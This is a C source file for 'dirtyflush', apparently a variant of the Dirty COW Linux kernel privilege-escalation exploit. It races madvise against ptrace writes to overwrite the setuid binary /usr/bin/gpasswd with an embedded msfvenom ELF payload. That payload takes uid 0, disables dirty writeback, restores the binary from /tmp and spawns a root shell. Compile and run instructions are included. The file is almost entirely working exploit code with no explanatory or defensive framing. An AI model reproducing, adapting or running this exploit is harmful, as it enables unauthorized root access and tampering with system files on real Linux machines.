// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirtyflush.c -o dirtyflush -lcrypt
//
// Use with:
//   ./dirtyflush

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/usr/bin/gpasswd";
const char *backup_filename = "/tmp/bak";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

/*
* $ msfvenom -p linux/x64/exec CMD="echo 0 > /proc/sys/vm/dirty_writeback_centisecs&&cp -f /tmp/bak /usr/bin/gpasswd&&/bin/bash" PrependSetuid=True -f elf | xxd -i
*/ 
unsigned char setflushcom[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8e, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
  0x5c, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68, 0x6f, 0x20, 0x30, 0x20, 0x3e,
  0x20, 0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x79, 0x73, 0x2f, 0x76,
  0x6d, 0x2f, 0x64, 0x69, 0x72, 0x74, 0x79, 0x5f, 0x77, 0x72, 0x69, 0x74,
  0x65, 0x62, 0x61, 0x63, 0x6b, 0x5f, 0x63, 0x65, 0x6e, 0x74, 0x69, 0x73,
  0x65, 0x63, 0x73, 0x26, 0x26, 0x63, 0x70, 0x20, 0x2d, 0x66, 0x20, 0x2f,
  0x74, 0x6d, 0x70, 0x2f, 0x62, 0x61, 0x6b, 0x20, 0x2f, 0x75, 0x73, 0x72,
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x67, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64,
  0x26, 0x26, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00,
  0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
int comlen = 259;


void *madviseThread(void *arg) {
  int c = 0;
  int lastoffset = 0;

  if(comlen % sizeof(long) == 0)
          lastoffset = sizeof(long);
  else
          lastoffset = comlen % sizeof(long);

  while(1) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  //printf("madvise %d\n\n", c);
}

int main(int argc, char *argv[])
{
  char shcommand[64] = {0};
  char shoutput[64] = {0};

  FILE *stream;

  sprintf(shcommand, "cat /proc/sys/vm/dirty_writeback_centisecs");
  stream = popen(shcommand, "r" );
  fread(shoutput, sizeof(char), sizeof(shoutput), stream);
  pclose(stream);
  printf("/proc/sys/vm/dirty_writeback_centisecs = %s\n", shoutput);

  // backup file
  sprintf(shcommand, "cp -f %s %s", filename, backup_filename);
  system(shcommand);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int o, c = 0;
    for(o = 0; o < comlen; o = o + sizeof(long)) {
      while(1) {
        c += ptrace(PTRACE_POKETEXT,
                    pid,
                    map + o,
                    *((long*)(setflushcom + o)));
        if(*((long*)(setflushcom + o)) == *((long*)(map + o)))
              break;
      }
      //printf("com : map = %s : %s\n", setflushcom + o, map + o);
    }
    kill(pid, SIGKILL);
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  system(filename);

  return 0;
}